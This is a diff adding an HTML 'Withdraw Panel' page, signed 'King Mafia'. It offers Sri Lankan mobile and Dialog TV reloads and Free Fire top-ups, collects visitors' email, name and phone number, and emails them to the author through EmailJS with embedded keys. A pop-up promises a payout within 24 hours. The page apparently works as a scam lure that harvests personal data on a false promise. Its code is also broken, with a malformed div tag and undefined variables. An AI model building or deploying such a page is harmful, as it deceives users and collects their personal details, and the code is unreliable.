@@ -1,0 +1,204 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8">  
+  <title>Withdraw Panel</title>  
+  <style>  
+    body {  
+      background: #000;  
+      color: #fff;  
+      font-family: Arial;  
+      text-align: center;  
+      padding: 20px;  
+    }  
+  
+    h1 {  
+      font-size: 28px;  
+      margin-bottom: 20px;  
+    }  
+  
+    .button {  
+      padding: 10px 20px;  
+      background: limegreen;  
+      color: #000;  
+      font-weight: bold;  
+      font-size: 16px;  
+      border: none;  
+      border-radius: 10px;  
+      cursor: pointer;  
+    }  
+  
+    .card-buttons {  
+      margin-top: 20px;  
+    }  
+  
+    .card-button {  
+      border: 2px solid limegreen;  
+      background: #000;  
+      color: limegreen;  
+      padding: 10px 20px;  
+      border-radius: 10px;  
+      margin: 5px;  
+      cursor: pointer;  
+    }  
+  
+    .card-button img {  
+      width: 24px;  
+      height: 24px;  
+      vertical-align: middle;  
+      margin-right: 5px;  
+    }  
+  
+    #formContainer {  
+      display: none;  
+      margin-top: 30px;  
+      padding: 20px;  
+      border: 2px solid #0f0;  
+      border-radius: 10px;  
+      background-color: #111;  
+    }  
+  
+    input {  
+      width: 90%;  
+      padding: 10px;  
+      margin: 10px auto;  
+      display: block;  
+      border-radius: 5px;  
+      border: none;  
+    }  
+  
+    #cardImage {  
+      width: 100px;  
+      border-radius: 10px;  
+      margin: 10px auto;  
+    }  
+  
+    #submitBtn {  
+      background: limegreen;  
+      color: #000;  
+      font-weight: bold;  
+    }  
+  
+    small {  
+      display: block;  
+      margin-top: 20px;  
+      color: #888;  
+    }  
+  
+  
+  
+  </style>  
+</head>  
+<body>  
+  
+  <h1>Withdraw Panel</h1>  
+  <button class="button" onclick="showCardOptions()">Get Withdraw</button>  
+  
+  <div class="card-buttons" id="cardOptions" style="display:none;">  
+    <button class="card-button" onclick="selectCard('Dialog')">  
+      <img src="https://i.postimg.cc/9FQhFcQS/dialog-logo-png-seeklogo-203576.png"> Dialog Card  
+    </button>  
+    <button class="card-button" onclick="selectCard('Hutch')">  
+      <img src="https://i.postimg.cc/gcDpWxm8/hutch-logo-png-seeklogo-323552.png"> Hutch Card  
+    </button>  
+    <button class="card-button" onclick="selectCard('Mobitel')">  
+      <img src="https://i.postimg.cc/ncP4pRf9/sltmobitel-logo-png-seeklogo-433080.png"> Mobitel Card  
+    </button>  
+    <button class="card-button" onclick="selectCard('FF')">  
+      <img src="https://i.imgur.com/VXzG2uk.png"> FF ID Top-up  
+    </button>  
+      <button class="card-button" onclick="selectCard('TV')">  
+      <img src="https://i.imgur.com/VXzG2uk.png"> Dialog TV Reload  
+    </button>  
+  </div>  
+     
+  <divhttps: id="formContainer">  
+    <h2 id="formTitle"></h2>  
+    <img id="cardImage" src="" alt="Card Image">  
+    <form id="withdrawForm">  
+      <input type="text" id="name" placeholder="Your Active Email " required>  
+      <input type="text" id="number" placeholder="Your Name" required>  
+      <input type="text" id="message" placeholder="Your Nomber /Relod එක දාන්න ඔනි නොම්බරෙ/" required>  
+      <input type="text" id="time" readonly>  
+      <input type="submit" id="submitBtn" value="Submit">  
+    </form>  
+    <small>2025 - Made by King Mafia | KING MS</small>  
+  </div>  
+  
+  
+  
+  
+      
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>  
+  <script>  
+    emailjs.init("JxcwLhzOOhD35rRUH");  
+    const form = document.getElementById("withdrawForm");  
+    const numberInput = document.getElementById("number");  
+    const formContainer = document.getElementById("formContainer");  
+    const cardImage = document.getElementById("cardImage");  
+    const formTitle = document.getElementById("formTitle");  
+  
+    const imageMap = {  
+      "Dialog": "https://i.postimg.cc/9FQhFcQS/dialog-logo-png-seeklogo-203576.png",  
+      "Hutch": "https://i.postimg.cc/gcDpWxm8/hutch-logo-png-seeklogo-323552.png",  
+      "Mobitel": "https://i.postimg.cc/ncP4pRf9/sltmobitel-logo-png-seeklogo-433080.png",  
+      "FF": "https://i.imgur.com/VXzG2uk.png",  
+      "TV": "https://i.imgur.com/VXzG2uk.png"  
+    };  
+  
+    function showCardOptions() {  
+      document.getElementById("cardOptions").style.display = "block";  
+    }  
+  
+    function selectCard(type) {  
+      formContainer.style.display = "block";  
+  
+      const now = new Date().toLocaleString();  
+      document.getElementById("time").value = now;  
+  
+      formTitle.innerText = type + " Reload";  
+      cardImage.src = imageMap[type];  
+  
+      // Change input placeholder based on type  
+      if (type === "FF") {  
+        massageInput.placeholder = "Enter your Free Fire ID";  
+      } else if (type === "TV") {  
+        massageInput.placeholder = "Enter your Dialog TV Number";  
+      } else {  
+        messageInput.placeholder = "Enter your Phone Number";  
+      }  
+    }  
+      
+    form.addEventListener("submit", function (e) {  
+      e.preventDefault();  
+      alert("මොහොතක් රැදි සිටින්න...")  
+      const data = {  
+        name: document.getElementById("name").value,  
+        number: document.getElementById("number").value,  
+        message: document.getElementById("message").value,  
+        time: document.getElementById("time").value,  
+        title: formTitle.innerText,  
+      };  
+  
+      emailjs.send("service_2wht3tb", "template_jrstb44", data)  
+        .then(() => {  
+          alert("✅ Withdraw request sent successfully!");  
+          alert("පැය 24ක් යාමට පෙර ඔබෙ යිල්ලිම යිටු වෙවි!")  
+  
+          form.reset();  
+          formContainer.style.display = "none";  
+        })  
+        .catch((err) => {  
+          console.error("❌ Error:", err);  
+          alert("❌ Something went wrong!");  
+        });  
+    });  
+  
+  
+  
+  
+  
+    
+  </script>  
+</body>  
+</html>
